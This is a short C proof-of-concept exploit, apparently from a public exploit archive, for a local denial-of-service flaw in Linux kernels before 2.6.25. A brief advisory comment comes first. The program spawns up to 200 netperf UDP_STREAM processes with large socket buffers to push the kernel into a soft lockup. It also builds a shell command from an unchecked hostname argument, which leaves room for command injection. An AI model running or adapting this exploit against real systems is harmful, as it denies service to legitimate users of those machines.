/*
source: http://www.securityfocus.com/bid/32985/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Local attackers can exploit this issue to cause a soft lockup, denying service to legitimate users.

Versions prior to Linux kernel 2.6.25 are vulnerable.
*/


#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define MAXTASKS 200
int main(int argc, char *argv[])
{
	int i;
	char cmd[128];
	FILE *f;
	pid_t pids[MAXTASKS];
	pid_t pid;
	unsigned int num;

	if (argc < 3) {
		printf("enter netserver hostname as the first parameter\n");
		printf("enter number of netperf tasks as the second parameter\n");
		return 1;
	}

	f = fopen("/dev/null", "w");
	if (!f) {
		printf("cannot open /dev/nu;;\n");
		return 2;
	}
	sprintf(cmd, "netperf -H %s -l 60 -t UDP_STREAM -- -s 262144 -r 262144 -m 16384", argv[1]);

	num = atoi(argv[2]);
	if (num > MAXTASKS) {
		printf("number of tasks is too high, resetting to %ld\n", MAXTASKS);
		num = MAXTASKS;
	}

	for(i = 0; i < num; i++) {
		pid = fork();
		if (pid == 0) {	
			fclose(stdout);
			fclose(stderr);
			stdout = f;
			stderr = f;
			execl("/bin/sh", "/bin/sh", "-c", cmd, NULL);
		}
		else {
			printf("newpid: %d\n", pid);
			pids[i] = pid;
		}
	}
	for(i = 0; i < num; i++) {
		waitpid(pids[i], NULL, 0);
	}

	fclose(f);

	return 0;
}
